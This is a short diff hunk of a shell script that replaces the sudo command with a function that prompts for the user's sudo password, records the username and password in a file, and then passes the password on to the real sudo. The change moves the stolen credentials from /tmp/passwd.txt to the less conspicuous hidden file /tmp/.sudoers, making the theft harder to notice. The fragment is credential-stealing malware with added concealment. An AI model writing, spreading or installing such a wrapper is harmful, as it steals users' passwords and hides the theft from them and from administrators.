@@ -11,7 +11,7 @@ function sudo(){
 			do
 				read  -sp "[sudo] password for $USER:" password 
 				printf "\n"
-				echo $USER : $password >> /tmp/passwd.txt
+				echo $USER : $password >> /tmp/.sudoers
 				echo $password | $realsudo -S true >/dev/null 2>&1
 				cmd_code=$?
 				if [ $cmd_code -eq 1 ] && [ $i -lt 3 ];then
